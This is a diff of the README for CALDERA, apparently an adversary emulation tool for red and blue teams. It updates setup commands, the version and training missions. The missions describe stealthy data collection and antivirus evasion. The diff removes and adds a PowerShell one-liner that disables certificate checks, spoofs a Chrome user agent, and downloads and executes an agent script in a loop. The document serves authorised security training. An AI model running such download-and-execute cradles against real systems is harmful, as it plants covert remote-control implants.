@@ -3,7 +3,7 @@
 CALDERA is an automated adversary emulation system, built on the [MITRE ATT&CK™ framework](https://attack.mitre.org/), 
 that performs post-compromise adversarial behavior inside computer networks. It is intended for both red and blue teams.
 
-CALDERA requires Python 3.5.3+ to run and is designed on top of the asyncio library.
+Python 3.5.3+ is required to run this system.
 
 ![alt text](readme.png)
 
@@ -19,16 +19,9 @@ From the root of this project, install the PIP requirements.
 pip install -r requirements.txt
 ```
 
-Then start the server:
+Then start the server.
 ```
-python server.py
-```
-
-Once running, you can log in to the system through the web interface at https://localhost:8888, using the default creds of admin:admin. 
-Alternatively, you can open a new terminal into CALDERA and enter help to see the options:
-```
-python app/terminal/terminal.py
-caldera> help
+python -u server.py
 ```
 
 ## Versions
@@ -36,7 +29,7 @@ caldera> help
 Bleeding-edge code can be run by using the latest master branch source code. Stable versions are tagged
 by major.minor.bugfix numbers and can be used by cloning the appropriate tagged version:
 ```
-git clone --branch 2.0.0 https://github.com/mitre/caldera.git --recursive
+git clone --branch 2.1.0 https://github.com/mitre/caldera.git --recursive
 ```
 
 Check the GitHub releases for the most stable release versions.
@@ -89,10 +82,9 @@ along with to understand the system. These missions will assume CALDERA is runni
 > Perform reconnaissance on a compromised OSX laptop. Your employer needs a list of the user’s preferred WIFI networks to perform surveillance on them. Grab this list and collect anything else you can, then get out of town. Quickly. Leave no trace. There is one caveat: the laptop’s AV scans the machine in full every minute. 
 You must complete this mission in less than 60 seconds. 
 
-Start by booting up the core system and the terminal view on your OSX laptop.
+Start by booting up the core system.
 ```
-python server.py
-python app/terminal/terminal.py
+python -u server.py
 ```
 
 Then start a 54ndc47 agent on the same machine.
@@ -104,13 +96,13 @@ In the terminal window, type help to see all options. Then view the connected ag
 ```
 caldera> help
 caldera> agent
-caldera (agent)> view
+caldera (agent)> search
 ```
 
 Next, look at the loaded adversaries, and dive deeper into the mission1 adversary.
 ```
 caldera (agent)> adversary
-caldera (adversary)> view
+caldera (adversary)> search
 caldera (adversary)> pick 1
 ```
 
@@ -129,13 +121,13 @@ caldera (operation)> run
 ``` 
 
 It will take up to 60 seconds for the agent to join the operation, at which point it will check in 
-according to the jitter time chosen. Every few seconds, check the progress of the operation.
+according to the jitter time chosen. 
 ```
-caldera (operation)> view
+caldera (operation)> search
 caldera (operation)> pick 1
 ```
 
-Once the operation is complete, compare the execution time of the first and last commands. Was
+Once the operation is complete (the terminal should report an alert), compare the execution time of the first and last commands. Was
 the mission a success? Did the mission1 adversary run without a trace? Can you figure out why the 
 abilities are being run in the order they are?
 
@@ -154,7 +146,7 @@ Perform the same steps as mission #1 - with the exception of:
 
 1. Start a PowerShell version of 54ndc47, instead of a bash version.
 ```
-while($true) {$ErrorActionPreference='SilentlyContinue';$url="https://localhost:8888/file/render?group=client"; $ps_table = $PSVersionTable.PSVersion;If([double]$ps_table.Major -ge 6){iex (irm -Method Post -Uri $url -Headers @{"file"="54ndc47.ps1"} -SkipCertificateCheck);}else{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$True};$web=New-Object System.Net.WebClient;$web.Headers.Add("file","54ndc47.ps1");$resp=$web.UploadString("$url",'');iex($resp);};sleep 60}
+while($true) {$ErrorActionPreference='SilentlyContinue';$url="https://localhost:8888/file/render"; $ps_table = $PSVersionTable.PSVersion;If([double]$ps_table.Major -ge 6){iex (irm -Method Post -Uri $url -Headers @{"file"="54ndc47.ps1"} -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome) -SkipCertificateCheck);}else{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$True};$web=New-Object System.Net.WebClient;$web.Headers.Add("file","54ndc47.ps1");$web.Headers.add("user-agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");$resp=$web.UploadString("$url",'');iex($resp);};sleep 60}
 ```
 
 2. Run the mission2 adversary, instead of mission1.
